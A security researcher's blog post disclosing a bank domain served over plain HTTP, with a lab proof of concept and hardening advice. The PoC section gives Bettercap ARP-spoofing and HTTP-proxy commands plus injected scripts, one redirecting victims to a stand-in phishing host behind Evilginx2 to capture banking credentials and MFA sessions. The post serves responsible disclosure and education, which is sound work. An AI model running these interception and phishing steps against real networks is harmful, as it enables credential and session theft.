---
title: Phishing Bank Logins Over Plain HTTP in 2025
author: vrls
date: 2025-10-30
#categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [web, security, http, https, ssl, tls, phishing, login, credentials, bank, homebanking, password, report, disclosure, transparency, cert, csirt]
image: /assets/img/posts/2025/10/14cd2d8e32c5f4deb5fec7241d6cf7ce8a987c81c8ab9536bd216fdb961bc33b.png
#permalink: /posts/2025/10/phishing-bank-logins-over-plain-http-in-2025/
#image: /assets/img/posts/2025/10/MM/MD5SUMHASH.png #og:image
#image:
#  src: /assets/img/posts/YYYY/MM/MD5SUMHASH.png
#  width: 350   # in pixels
#  height: 350   # in pixels
---


<!--
<meta name="twitter:card" content="summary_large_image">
<meta property="twitter:domain" content="vrls.ws">
<meta property="twitter:url" content="https://vrls.ws/posts/2025/10/phishing-bank-logins-over-plain-http-in-2025/">
<meta name="twitter:title" content="Phishing Bank Logins Over Plain HTTP in 2025">
<meta name="twitter:description" content="Personal blog about computer hacking & security">
<meta name="twitter:image" content="https://vrls.ws/assets/img/posts/2025/10/14cd2d8e32c5f4deb5fec7241d6cf7ce8a987c81c8ab9536bd216fdb961bc33b.png">



 <img alt="" src="/assets/img/posts/2025/10/14cd2d8e32c5f4deb5fec7241d6cf7ce8a987c81c8ab9536bd216fdb961bc33b.png" width="550px" height="450px" /> -->




## Introduction 


Back in 2023, I noticed something unusual when accessing a homebanking website. My web browser is configured to always connect to websites using secure protocols such as SSL/TLS (HTTPS) and to warn when attempting to access an insecure (plaintext HTTP) version.

Surprisingly, I kept receiving an "insecure connection" warning each time I visited the site. This required me to manually bypass the browser’s security warning — and started to be annoying because I am too lazy to always click "Ignore SSL errors". Concerned, I decided to investigate further and report the issue to the bank’s operations team, as this misconfiguration could potentially be abused to intercept or steal users’ homebanking credentials.

In this post, I’ll start with a brief overview of relevant web and browser security concepts. Then, I’ll break down the specific vulnerability affecting the **BANK.PT** homebanking domain, followed by a proof-of-concept (PoC) demonstration to illustrate how an attacker could exploit this kind of misconfiguration.

Finally, I’ll share actionable recommendations for IT administrators and regular internet users to help improve their security posture and reduce the risk of credential theft and similar attacks.



## Timeline

This issue was initially discovered and reported in 2023, and follow-up attempts were made in 2024 and again in 2025, including escalations to multiple CERT/CSIRT teams. Despite multiple notifications, no remediation has been implemented to this date. Given the continued risk to banking customers I have chosen to proceed with public disclosure in the interest of transparency and public safety.

This article is also intended as an educational resource, helping others to identify similar subtle misconfigurations and take proactive steps to mitigate them before they are exploited.


| Date       | Action                                                                               |
| ---------- | -------------------------------------------------------------------------------------|
| 2023-05-19 | Vulnerability discovered during regular use of BANK homebanking portal.               |
| 2023-05-19 | Initial report sent to BANK via customer support channel.                             |
| 2023-06-02 | Response from BANK Operations Center (DSI) guarantees that homebanking has SSL/TLS.   |
| 2024-04-17 | Issue escalated to national CERT contacts: CERT.PT and CSIRT-BDP (Bank of Portugal). |
| 2024-04-18 | Response from CERT.PT and CSIRT-BDP: Issue forwarded to BANK.                          |
| 2025-06-19 | Follow-up with BANK, CERT.PT and CSIRT-BDP. No action was taken so far to remediate.   |
| 2025-06-19 | Response from CERT.PT and CSIRT-BDP. Attempting to reproduce the issue.               |
| 2025-10-30 | Public disclosure for transparency.                                                  |





## Back to Basics: SSL/TLS


The SSL/TLS protocol plays a critical role in protecting web traffic. When using the secure version of HTTP — HTTPS — websites are required to present a valid, trusted certificate. This allows client applications, such as web browsers, to verify the authenticity of the server they’re connecting to, ensuring that the user is communicating with the legitimate site and not an imposter. This is achieved through TTP's or Trusted Third Parties and certification authorities (CA) certificates installed in the system and browser.

Beyond authenticity, TLS provides confidentiality and integrity. It ensures that data transmitted between the client and server (such as login credentials, personal information, or session data) is encrypted, preventing third parties from intercepting or tampering with it.

The internet is an inherently insecure network. Any node in the communication path — such as a router, ISP, public Wi-Fi access point, or even government surveillance system — could theoretically intercept unencrypted HTTP traffic. This opens the door to eavesdropping, credential theft, and man-in-the-middle (MitM) attacks.

Given these risks, the use of TLS is not only considered best practice — it is mandatory for any website handling sensitive data. Security standards such as PCI DSS require HTTPS for all pages that handle payment or login data. In modern security architecture, serving plaintext HTTP — especially on a banking platform — is considered a critical misconfiguration.




### DNS Resolution & Web Services



| FQDN         | IP Address         | Port 80 (HTTP) | Port 443 (HTTPS) |URL                  |
|--------------|--------------------|----------------|------------------|---------------------|
| bank.pt       | 495.34.834.261    | ✅             | ❌               | http://bank.pt      |
| www.bank.pt   | 495.34.204.971    | ✅             | ✅               | http(s)://www.bank.pt  |


The table above shows the results of DNS resolution and the status of HTTP(S) services for each host. Notably, the HTTPS service (port 443) is not available. This means that if a user types `bank.pt` into their browser’s address bar, the browser will likely attempt to connect over HTTPS first — and then, depending on the browser and its configuration, will automatically fall back to plain HTTP (with or without a warning about lack of TLS).


<img alt="" src="/assets/img/posts/2025/10/383f2e74fb3410696afa1792b30646a647a52795d707de5d07ac3d6781e0ec7b.png" />


This fallback behavior introduces a security vulnerability. It creates a window where an attacker — particularly one positioned on the network (e.g., public Wi-Fi, compromised router, or ISP-level adversary) — can intercept or manipulate traffic during the fallback to HTTP.

Even if the site implements security headers like HTTP Strict Transport Security (HSTS), they only take effect after a secure HTTPS connection has been established at least once. If `bank.pt` has no HTTPS endpoint, HSTS cannot be applied — leaving users vulnerable to `Man-in-the-Middle (MitM) attacks`.


<img alt="" src="/assets/img/posts/2025/10/f9470dcee5414955971a395cc14a6faa273370e65f3b37021cd7962681c30ef2.png" />
<div style="text-align: center;"> Port 443 unreachable on bank.pt from multiple geographies, as tested via <a href="https://check-host.net">check-host.net</a>. </div>






### HTTP to HTTPS Redirection

To better understand the implications of this issue, let's walk through what happens when a user attempts to connect to the website, step by step.

Begin by opening a web browser and typing `bank.pt` into the navigation bar, then pressing **Enter**. At this point, the browser initiates a series of network operations:

1. **DNS Resolution**
   The browser performs DNS resolution to translate the domain `bank.pt` into its corresponding IP address. This may be done via the operating system’s DNS resolver or through a browser-integrated provider using DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT).

2. **Initial Connection Attempt over HTTPS (Port 443)**
   Once the IP address is resolved, the browser attempts to initiate a secure connection to the default HTTPS port (443). If the server responds and a TCP handshake is successfully completed, the browser proceeds with a TLS handshake to establish a secure channel.

3. **Failure to Connect to HTTPS (Port 443)**
   In this case, since the `bank.pt:443` service is either not listening or actively rejecting connections, the browser cannot establish a secure session. As a result, it falls back to HTTP and attempts to connect to port 80 instead.

4. **Insecure Fallback (Port 80)**
   When the browser falls back to HTTP, it makes an unencrypted request to 🚨 `http://bank.pt` 🚨. This downgrade to plaintext HTTP opens the door to various Man-in-the-Middle attacks. An attacker on the network path — such as on public Wi-Fi — can intercept and manipulate the request or response.

5. **Potential for Exploitation**
   At this point, a malicious actor could:

   * Redirect the user to a phishing site that mimics the real bank portal.
   * Inject malicious JavaScript into the response to steal credentials.
   * Serve a malware payload disguised as a browser update or bank-related document.

Even though modern browsers implement protections like **HSTS**, these cannot be applied if the HTTPS connection **fails outright**. Without a valid TLS handshake, the browser never receives the HSTS header, leaving the user completely exposed.


<img alt="" src="/assets/img/posts/2025/10/0208158bd8e36fbb0ee19d8f933aed75721add4753cf8abb88df8044d9efdcc8.png" />


Once the browser connects and sends an HTTP request to `bank.pt:80`, the server responds with a `301 Moved Permanently` HTTP status code, along with a `Location: https://www.bank.pt` response header. This header instructs the browser to redirect the user to a new URL — now using the `www` subdomain and the secure HTTPS protocol.

At this point, the browser proceeds to connect to `www.bank.pt` over port 443, where the HTTPS service is properly configured and reachable. It initiates a TLS handshake, during which the server presents its certificate:

```
Subject:
  jurisdictionC=PT;
  businessCategory=Private Organization;
  serialNumber=500XXXXXX;
  C=PT;
  L=Lisboa;
  O=BANK S.A.;
  CN=www.bank.pt

Issuer:
  C=US;
  O=DigiCert Inc;
  CN=DigiCert EV RSA CA G2
```

The browser validates this certificate and, if successful, proceeds to establish a secure connection with `https://www.bank.pt`.

While the final destination is secure, the initial connection and redirection happen in plaintext, meaning that an attacker with access to the traffic can intercept or tamper with the `HTTP 301 response`, potentially redirecting the user to a malicious domain instead of the legitimate one.







## **Man-in-the-Middle Attack (PoC)**

Now that we have a solid understanding of the root cause behind this security issue, we can proceed to demonstrate a **proof-of-concept (PoC)** attack in a controlled lab environment.

The lab consists of two clients:

* **Victim**: A regular user attempting to access the BANK homebanking website.
* **Attacker**: A malicious actor connected to the same **public Wi-Fi network**.

The attacker's goal is to intercept the victim's network traffic and manipulate communications to compromise security. This is achieved by performing a Man-in-the-Middle (MitM) attack, where the attacker silently positions themselves between the victim and the network gateway (e.g., Wi-Fi router).

One common method to accomplish this is ARP spoofing, where the attacker sends forged ARP messages to the victim and the router, causing all traffic between them to flow through the attacker's machine.

Once the victim attempts to access `http://bank.pt`, their browser connects over plain HTTP to port 80. Because this initial request is unencrypted, the attacker can:

* **Intercept** the HTTP request,
* **Modify the server's HTTP 301 response**, and
* **Redirect the user to a malicious phishing site** or inject malicious content into the response.

This setup is illustrated in the diagram below:


<img alt="" src="/assets/img/posts/2025/10/358b700d5599032ef0dc2c493326ea15385478e72f2e13bad265dac1a69bc87e.png" />
 
This scenario creates a realistic attack surface that could easily be exploited in the wild especially in untrusted networks like airports, cafes, or hotels.









### Intercepting the Traffic

To simulate a Man-in-the-Middle (MitM) scenario in a lab environment,  [Bettercap](https://www.bettercap.org/) was used to intercept and manipulate traffic over an insecure Wi-Fi network. The process involves configuring Bettercap to identify active hosts on the local network and perform ARP spoofing to impersonate the network gateway.

First, enable Bettercap’s network reconnaissance module:

```bash
net.probe on
net.show
```

This allows to discover connected devices and identify the target (victim). 

<img alt="" src="/assets/img/posts/2025/10/1b1a87e7c9d37c26fa08a8c4f7422d701bbd109a6a5a157e9c870584a4f74bcc.png" />



Once the `victim's IP address (192.168.99.24)` is known, enable IP forwarding on the attacker machine to ensure routing works correctly (actually Bettercap does this automatically):

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

With forwarding enabled, initiate ARP spoofing to position ourselves between the victim and the gateway:

```bash
set arp.spoof.targets <victim_ip>
arp.spoof on
```

Now, all traffic from the victim flows through our attacker machine. Then activate Bettercap’s HTTP proxy module to intercept and modify plaintext HTTP responses:

```bash
http.proxy on
```

With the proxy active, we can inject arbitrary JavaScript into the victim's browser whenever they visit a non-encrypted HTTP website — creating an opportunity to redirect, log keystrokes, or load a phishing page.

This setup demonstrates how easily insecure HTTP communication can be compromised on an open network, highlighting the critical importance of HTTPS and HSTS protections.

<img alt="" src="/assets/img/posts/2025/10/e25b2a672ba30c3726658c32cbf47d1479c79713e87d40e31cba37e18753c604.png" />





### Injecting JavaScript in Victims Browser

Once ARP spoofing is in place and the victim’s traffic is flowing through the attacker machine, Bettercap’s HTTP proxy can be used to inject custom JavaScript into any plaintext HTTP response. This is a powerful technique to manipulate web content in transit.

For this **PoC**, a simple JavaScript payload was served from the attacker’s machine at `/tmp/payload.js` that will simply pop-up an alert message box. This script could be designed to log keystrokes, redirect the victim to a phishing page, or display a fake login modal.

Example injection:

```html
<script>alert("vrls.ws")</script>
```


<img alt="" src="/assets/img/posts/2025/10/35928a56dda1352b524fc951e3e23741593ce8f41a20eb5d0c4c7c3b8545a8e7.png" />

The injected payload is automatically added to HTTP pages accessed by the victim. Since no TLS encryption is present, the victim has no way of detecting that the content has been altered.

<img alt="" src="/assets/img/posts/2025/10/b74237468972cf0e58ca096d26e3d7ede89ddeeefb1fcc4db68dae1ab092cb59.png" />




### Phishing Credentials With Evilginx2


With Evilginx2, it's possible to perform advanced phishing attacks by acting as a transparent reverse proxy between the victim and a legitimate service. The framework captures session tokens, cookies, and credentials in real-time without ever needing to break encryption or decrypt HTTPS traffic. This is particularly effective against multi-factor authentication (MFA), as Evilginx proxies and relays the entire authenticated session.

In this scenario, we're targeting a homebanking platform. To improve reliability and success rate, we enhance Evilginx's capabilities by injecting a small JavaScript snippet into the proxied page. This JS payload executes in victim browser and **silently redirects to a cloned, attacker-controlled phishing page** hosted behind Evilginx.

```html
<script>window.location.href='https://bankonline.evil.local';</script>
```

The script is injected in HTTP communications of our victim. Before the redirect to the secure website, the attacker can inject the script above to force the browser navigate to an arbitrary website that will be used to capture (phish) victims passwords.

<img alt="" src="/assets/img/posts/2025/10/510afbb8bc8335ab054423d9f9dd38e8c25416f581d1223e66b9ba19462412eb.png" />

This redirection is done seamlessly. The phishing page mimics the original bank login page with high fidelity, capturing:

* Contract/User ID
* Access code or password
* Optionally, session tokens or OTP (e.g. code sent via SMS) if the victim is actively authenticated

The injected JS is scoped and timed carefully. Once the user enters their credentials into the fake login form, the data is captured and exfiltrated to the attacker's backend.


<img alt="" src="/assets/img/posts/2025/10/6ed99cd5c20198b4f20f6dfe987cedee876e8dfe9ce3a00fa74c7cb37080374d.png" />


To conclude the PoC, this method demonstrates how real-time credential harvesting combined with session hijacking can fully bypass MFA, giving the attacker immediate and persistent access to the victims banking session.








## Security Best Practices

Mitigating the risk of HTTP-based attacks, especially on sensitive services like online banking, requires both users and system administrators to adopt security best practices. Below is a breakdown of actionable advice for each audience.


### Regular Internet Users

Protecting your data while browsing requires a layered approach. The following steps can significantly improve your online security and privacy:

#### Harden Your Browser

* **Use Firefox with Betterfox**: Betterfox is a set of `user.js` performance & privacy tweaks for Firefox.
  * GitHub: [Betterfox](https://github.com/yokoffing/BetterFox)



#### VPN on Untrusted Networks

* Always use a **VPN** when connected to public or insecure Wi-Fi networks (airports, cafes, etc.).
* Prefer **full-tunnel VPNs** that encrypt all traffic (not just DNS or browser).
* Look for providers offering **secure DNS support** as well.
* Remember that a VPN provider can always decrypt and inspect your traffic (!)

  * PrivacyGuides VPN recommendations (no endorsement, DYOR):
    [NordVPN](https://nordvpn.com/), [ProtonVPN](https://protonvpn.com/), [Mullvad](https://mullvad.net/), [IVPN](https://www.ivpn.net/)
  * More info: [PrivacyGuides – VPNs](https://www.privacyguides.org/en/vpn/)

#### Secure DNS (DoH / DoT)

* Opt for **DNS-over-HTTPS (DoH)** or **DNS-over-TLS (DoT)** to prevent DNS leaks and tampering.
* Recommended secure DNS providers:

  * [Mullvad Adblock DNS](https://mullvad.net/en/help/dns-over-https-and-dns-over-tls/)
  * [DNS.SB](https://dns.sb/)

**Linux (systemd-resolved example):**

```ini
# /etc/systemd/resolved.conf
DNS=194.242.2.3#adblock.dns.mullvad.net 185.222.222.222#dot.sb
DNSOverTLS=yes
DNSSEC=yes
```

**Windows 11** also supports secure DNS system-wide.

* See: *Settings → Network → Advanced network settings → DNS settings*

#### Enforce HTTPS

* Most modern browsers already **enforce HTTPS by default**, but you can reinforce it with:

  * The now-deprecated [HTTPS Everywhere](https://www.eff.org/https-everywhere) (legacy support)
  * Built-in settings in Firefox or Chromium-based browsers to “Always use HTTPS”

#### Adblocker

* [uBlock Origin](https://ublockorigin.com/)
* [AdGuard](https://adguard.com/en/adguard-ios/overview.html)

#### 📚 Learn More

* [PrivacyGuides.org](https://www.privacyguides.org/) offers well-researched and community-vetted advice on staying safe and private online.







### IT, System Administrators & Devs

If you're responsible for managing public-facing web services, here are essential security practices to enforce:

#### Enforce Secure Connections

* Disable Port 80 (HTTP) unless strictly needed. Redirect HTTP to HTTPS early at the network edge.
* Serve all content via port 443 with TLS.

#### Implement HSTS Properly

* Use the `Strict-Transport-Security` (HSTS) header to force browsers to use HTTPS, example:

  ```
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ```

* Enforce security headers like `CSP, X-Frame-Options, Referrer-Policy`, etc.

* Register for HSTS Preloading for high-value or sensitive domains:
  * [https://hstspreload.org/](https://hstspreload.org/)

* Note from Mozilla Developer Docs (MDN) about HTTP Strict Transport Security redirects:
<img alt="" src="/assets/img/posts/2025/10/a7d47e32e39d801835c97a33cda3d8600fba6fd062c9846db3e6fe3b6b5fc534.png" />


#### Secure Infrastructure

* Secure architecture when using load balancers, WAFs, or reverse proxies. Ensure TLS is not stripped prematurely.
* Consider when and where to perform SSL/TLS offloading to reduce exposure between internal layers.
* Ensure TLS certificates are valid, trusted, and renewed.

#### Test & Monitor

* Perform regular security assessemnts, external attack surface discovery and penetration testing.
* Monitor for expired certificates, insecure redirects, and open ports.







## Toolset

| Tool / Component          | Purpose                                                                   |
| ------------------------- | ------------------------------------------------------------------------- |
| **Bettercap**             | Man-in-the-Middle (MitM) via ARP spoofing and HTTP interception           |
| **Evilginx2**             | Reverse proxy phishing framework used to capture credentials and tokens   |
| **Custom Phishlet**       | Tailored Evilginx2 configuration to replicate BANK homebanking     |
| **Custom Certificate CA** | Attacker-controlled TLS cert for testing HTTPS scenarios (e.g. Letsencrypt) |
| **Lab Environment (VMs)** | Isolated virtual machines simulating victim, attacker, and network setups |


*⚠️ Note: Evilginx2 phishlet will not be shared publicly.* 







## Conclusion

This case highlights how the absence of HTTPS support on a critical banking domain introduces a real and exploitable weakness that can be leveraged by adversaries in common threat environments such as public Wi-Fi.

Despite the bank’s main service enforcing HTTPS correctly, the fallback behavior caused by the unsecured domain leaves users exposed before any TLS security guarantees are in place.

Even with protections like HSTS and browser hardening, the reality is that misconfigurations on the server side still matter and can undermine user-side efforts.

This blog post aims to:
* Raise awareness about HTTPS and HSTS importance,
* Demonstrate realistic exploitation paths using readily available tooling,
* Encourage better default configurations by system administrators,
* Encourage users to take steps toward a more secure browsing experience.

This article demonstrates that MitM attacks are still possible in 2025 and can have high impact especially when basic security misconfigurations, like missing SSL/TLS, remain present in critical infrastructure.



## References

- [HSTS Preload List - hstspreload.org](https://hstspreload.org/)
- [Strict-Transport-Security Header - MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security)
- [Firefox connection upgrades - HTTP to HTTPS - Mozilla](https://support.mozilla.org/en-US/kb/https-upgrades)
- [Mullvad DNS (DoH/DoT) - mullvad.net](https://mullvad.net/en/help/dns-over-https-and-dns-over-tls)
- [Secure DNS (DoT) - dns.sb](https://dns.sb/dot/linux/)
- [Bettercap - bettercap.org](https://www.bettercap.org/)
- [Evilginx2 - GitHub](https://github.com/kgretzky/evilginx2)
- [Service Status Check - check-host.net](https://check-host.net/)
- [Betterfox Firefox Hardening - GitHub](https://github.com/yokoffing/BetterFox)
- [HTTPS Everywhere Extension (Archive) - EFF](https://www.eff.org/https-everywhere)
- [uBlock Origin - ublockorigin.com](https://ublockorigin.com/)
- [AdGuard (iOS) - adguard.com](https://adguard.com/en/adguard-ios/overview.html)
- [Privacy Tools & Guides - privacyguides.org](https://www.privacyguides.org/)

